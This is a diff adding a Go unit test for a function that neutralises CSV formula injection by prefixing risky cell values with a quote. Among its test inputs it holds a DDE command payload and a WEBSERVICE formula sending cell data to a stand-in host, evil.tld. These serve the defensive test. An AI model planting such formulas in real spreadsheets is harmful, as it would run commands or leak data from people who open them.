@@ -1896,6 +1896,62 @@ func TestListHosts(t *testing.T) {
 	require.True(t, ds.LoadHostSoftwareFuncInvoked)
 }
 
+func TestSanitizeCSVFormula(t *testing.T) {
+	t.Parallel()
+
+	cases := []struct {
+		name string
+		in   string
+		want string
+	}{
+		{"empty", "", ""},
+		{"equals", "=1+1", "'=1+1"},
+		{"plus", "+SUM(1,1)", "'+SUM(1,1)"},
+		{"minus", "-2+3", "'-2+3"},
+		{"at", "@SUM(1,1)", "'@SUM(1,1)"},
+		{"dde command", `=cmd|'/c calc'!A1`, `'=cmd|'/c calc'!A1`},
+		{"webservice exfiltration", `=WEBSERVICE("http://evil.tld/?x="&A1)`, `'=WEBSERVICE("http://evil.tld/?x="&A1)`},
+		{"tab", "\t=1+1", "'\t=1+1"},
+		{"carriage return", "\r=1+1", "'\r=1+1"},
+		{"hyphen leading text", "-laptop", "'-laptop"},
+		{"leading space", " =1+1", "' =1+1"},
+		{"leading spaces", "   @SUM(1,1)", "'   @SUM(1,1)"},
+		{"newline then formula", "\n=1+1", "'\n=1+1"},
+
+		// Values that must be left untouched.
+		{"whitespace only", "   ", "   "},
+		{"tab then text", "\tfoo", "\tfoo"},
+		{"leading space then number", " -1", " -1"},
+		{"trailing space after number", "-5 ", "-5 "},
+		{"integer", "42", "42"},
+		{"negative integer", "-1", "-1"},
+		{"negative float", "-1.5", "-1.5"},
+		{"positive sign", "+1", "+1"},
+		{"negative exponent", "-1.5e10", "-1.5e10"},
+		{"email", "user@example.com", "user@example.com"},
+		{"timestamp", "2022-03-15T17:23:56Z", "2022-03-15T17:23:56Z"},
+		{"hostname", "foo.local0", "foo.local0"},
+		{"zero", "0", "0"},
+		{"internal equals", "a=1+1", "a=1+1"},
+		{"newline leading", "\nfoo", "\nfoo"},
+	}
+
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			t.Parallel()
+			require.Equal(t, c.want, sanitizeCSVFormula(c.in))
+		})
+	}
+
+	t.Run("already sanitized values are left alone", func(t *testing.T) {
+		t.Parallel()
+		// The single quote is not a formula trigger, so re-applying the
+		// transformation must not stack prefixes.
+		once := sanitizeCSVFormula("=1+1")
+		require.Equal(t, once, sanitizeCSVFormula(once))
+	})
+}
+
 func TestStreamHosts(t *testing.T) {
 	t.Run("Happy path", func(t *testing.T) {
 		// Create a mock iterator for the hosts.
